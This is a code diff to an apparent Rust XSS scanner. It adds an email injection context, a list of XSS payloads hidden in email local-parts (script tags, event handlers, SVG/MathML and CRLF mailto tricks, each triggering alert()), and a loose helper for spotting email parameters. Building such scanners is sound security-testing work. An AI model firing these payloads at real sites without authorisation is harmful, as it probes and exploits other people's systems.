@@ -22,7 +22,59 @@ pub enum InjectionContext {
     UrlParameter,      // href="USER_INPUT"
     CssContext,        // style="color: USER_INPUT"
     JsonValue,         // {"key": "USER_INPUT"}
+    EmailAddress,      // Email fields (special XSS via local-part)
     Unknown,
+}
+
+/// Email XSS payloads - targeting the local-part before @ sign
+/// These exploit mail rendering/display systems that don't sanitize
+pub fn get_email_xss_payloads() -> Vec<String> {
+    vec![
+        // Event handler in display name style (before @)
+        r#""<img/src/onerror=alert(1)>"@example.com"#.to_string(),
+        r#""<svg/onload=alert(1)>"@example.com"#.to_string(),
+        r#""<body/onload=alert(1)>"@example.com"#.to_string(),
+        r#""<input/onfocus=alert(1)/autofocus>"@example.com"#.to_string(),
+        // Script tag in parentheses (some parsers allow this)
+        "test+(<script>alert(0)</script>)@example.com".to_string(),
+        "test+(<img src=x onerror=alert(1)>)@example.com".to_string(),
+        "test+<script>alert(1)</script>@example.com".to_string(),
+        // Local-part with special chars
+        r#""><script>alert(1)</script>"@example.com"#.to_string(),
+        r#""'><script>alert(1)</script>"@example.com"#.to_string(),
+        // Encoded variants
+        "test%2B%3Cscript%3Ealert(1)%3C/script%3E@example.com".to_string(),
+        // Using valid RFC 5321 quoted local-part
+        r#""<script>alert(document.domain)</script>"@example.com"#.to_string(),
+        r#"".alert(1)."@example.com"#.to_string(),
+        // Breaking out of mailto:
+        "test@example.com%0d%0a<script>alert(1)</script>".to_string(),
+        // Display name injection
+        "attacker<script>alert(1)</script>@example.com".to_string(),
+        // SVG payload in email
+        r#""<svg><script>alert(1)</script></svg>"@example.com"#.to_string(),
+        // Math ML payload
+        r#""<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>"@example.com"#.to_string(),
+        // Nested quotes exploitation
+        r#""""><img src=x onerror=alert(1)>"@example.com"#.to_string(),
+    ]
+}
+
+/// Check if a parameter name suggests email context
+pub fn is_email_parameter(param: &str) -> bool {
+    let param_lower = param.to_lowercase();
+    param_lower.contains("email")
+        || param_lower.contains("mail")
+        || param_lower == "e"
+        || param_lower == "em"
+        || param_lower.contains("recipient")
+        || param_lower.contains("to")
+        || param_lower.contains("from")
+        || param_lower.contains("cc")
+        || param_lower.contains("bcc")
+        || param_lower.contains("sender")
+        || param_lower.contains("contact")
+        || param_lower.contains("address")
 }
 
 /// XSS detection context and results
